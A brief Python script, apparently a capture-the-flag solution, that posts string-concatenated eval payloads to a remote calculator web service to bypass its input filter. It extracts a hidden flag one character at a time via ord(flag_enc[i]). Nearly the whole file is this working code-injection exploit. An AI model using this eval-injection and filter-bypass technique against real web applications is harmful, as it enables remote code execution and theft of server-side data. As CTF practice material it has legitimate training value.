import requests

i = 1
s = "abcdeghijklmnopqrstuvwxyzABCDEGHIJKLMNOPQRSTUVWX"
data = {}
for l in s:
    data[l] = i
    i += 1

print(data)

flag = ""
for c in range(41):
    data = {"f":"eval('o' + 'r' + 'd(' + 'fla' + 'g_enc[' + '" + str(c) +  "' + '])')"}
    print(data["f"])
    r = requests.post("https://calculator-3tjck.ondigitalocean.app/calc", json=data)
    flag += chr(int(r.json()["result"]))

print(flag)
